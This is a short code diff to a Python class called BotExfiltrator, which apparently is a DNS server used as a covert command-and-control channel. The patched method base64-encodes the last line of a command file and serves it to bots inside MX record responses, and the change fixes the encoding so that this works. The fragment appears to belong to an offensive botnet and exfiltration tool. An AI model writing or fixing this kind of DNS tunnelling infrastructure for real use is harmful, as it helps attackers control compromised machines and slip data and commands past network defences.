@@ -70,7 +70,7 @@ class BotExfiltrator(DNSServer):
                  cmd = base64.standard_b64encode(f.readlines()[-1][:-1].encode('utf-8'))
         except:
             cmd = base64.standard_b64encode(bytes(''))
-        return RR(name, QTYPE.MX, rdata=MX(cmd + "." + self.context['domain']), ttl=0)
+        return RR(name, QTYPE.MX, rdata=MX(cmd.decode('utf-8') + "." + self.context['domain']), ttl=0)
 
 
 # Run the actual server. 
